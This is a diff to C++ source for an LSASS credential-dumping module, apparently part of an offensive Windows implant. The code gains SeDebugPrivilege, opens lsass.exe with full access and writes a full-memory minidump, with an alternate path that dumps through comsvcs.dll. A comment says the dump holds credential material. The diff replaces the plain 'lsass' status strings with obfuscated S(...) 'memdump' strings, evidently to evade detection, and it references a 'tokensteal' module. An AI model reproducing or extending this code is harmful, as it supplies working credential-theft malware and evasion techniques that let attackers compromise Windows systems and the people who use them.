@@ -54,20 +54,20 @@ std::string LsassDump::Dump(const std::string& outPath) {
     EnablePrivilege("SeDebugPrivilege");
 
     DWORD pid = FindLsassPid();
-    if (!pid) return "lsass: process not found";
+    if (!pid) return S("memdump: target not found");
 
     // Detection: OpenProcess(PROCESS_ALL_ACCESS) on lsass.exe from non-system binary
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc) {
-        return "lsass: OpenProcess failed err=" + std::to_string(GetLastError()) +
-               " (run tokensteal first for SeDebugPrivilege)";
+        return S("memdump: access denied err=") + std::to_string(GetLastError()) +
+               S(" (run tokensteal first)");
     }
 
     HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         CloseHandle(hProc);
-        return "lsass: CreateFile failed for " + outPath;
+        return S("memdump: file create failed for ") + outPath;
     }
 
     // MiniDumpWithFullMemory captures every accessible page including credential material.
@@ -87,15 +87,15 @@ std::string LsassDump::Dump(const std::string& outPath) {
 
     if (!ok) {
         DeleteFileA(outPath.c_str());
-        return "lsass: MiniDumpWriteDump failed err=" + std::to_string(GetLastError());
+        return S("memdump: write failed err=") + std::to_string(GetLastError());
     }
-    return "lsass: dump written -> " + outPath +
+    return S("memdump: written -> ") + outPath +
            " (" + std::to_string(fileBytes) + " bytes)";
 }
 
 std::string LsassDump::DumpViaComsvcs(const std::string& outPath) {
     DWORD pid = FindLsassPid();
-    if (!pid) return "lsass: process not found";
+    if (!pid) return S("memdump: target not found");
 
     char windir[MAX_PATH] = {};
     GetWindowsDirectoryA(windir, sizeof(windir) - 1);
@@ -115,7 +115,7 @@ std::string LsassDump::DumpViaComsvcs(const std::string& outPath) {
     sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
 
     if (!ShellExecuteExA(&sei)) {
-        return "lsass (comsvcs): ShellExecuteEx failed err=" + std::to_string(GetLastError());
+        return S("memdump: launcher failed err=") + std::to_string(GetLastError());
     }
 
     if (sei.hProcess) {
@@ -125,7 +125,7 @@ std::string LsassDump::DumpViaComsvcs(const std::string& outPath) {
 
     DWORD attr = GetFileAttributesA(outPath.c_str());
     if (attr == INVALID_FILE_ATTRIBUTES) {
-        return "lsass (comsvcs): dump not created — may need SeDebugPrivilege or SYSTEM token";
+        return S("memdump: output not created — need SeDebugPrivilege or SYSTEM token");
     }
 
     HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
@@ -136,6 +136,6 @@ std::string LsassDump::DumpViaComsvcs(const std::string& outPath) {
         CloseHandle(hFile);
     }
 
-    return "lsass (comsvcs): dump written -> " + outPath +
+    return S("memdump: written -> ") + outPath +
            " (" + std::to_string(fileBytes) + " bytes)";
 }
